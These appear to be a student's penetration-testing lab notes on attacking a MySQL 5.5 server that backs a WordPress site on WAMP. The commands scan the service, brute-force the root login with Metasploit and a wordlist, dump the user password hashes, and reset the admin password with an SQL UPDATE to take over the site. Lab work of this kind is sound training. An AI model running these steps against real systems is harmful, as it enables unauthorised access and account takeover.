MySQL 5.5.20-log- 3306 + wamp port 8585

- cat /etc/hosts
- nmap -sV -sC -p 3306 10.0.25.212 
- searchsploit MySQL 5.5
- msfconsole
- use auxiliary/scanner/mysql/mysql_login
- user = root
- set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
- mysql -u root -p -h 10.0.25.212
	- show databases;
	- use wordpress;
	- show tables;
	- select * from wp_users;
	- From this point, we can copy the password hashes displayed in the user_pass column. Alternatively, we can also change the password for the admin user so that we can login to the WordPress site being hosted on the WAMP server we identified in an earlier lab.
	- UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
	- http://<TARGET-IP>/8585/wordpress/wp-admin

We have been able to successfully gain access to the MySQL database server and modify the WordPress admin user account password consequently gaining administrative control over the WordPress site.
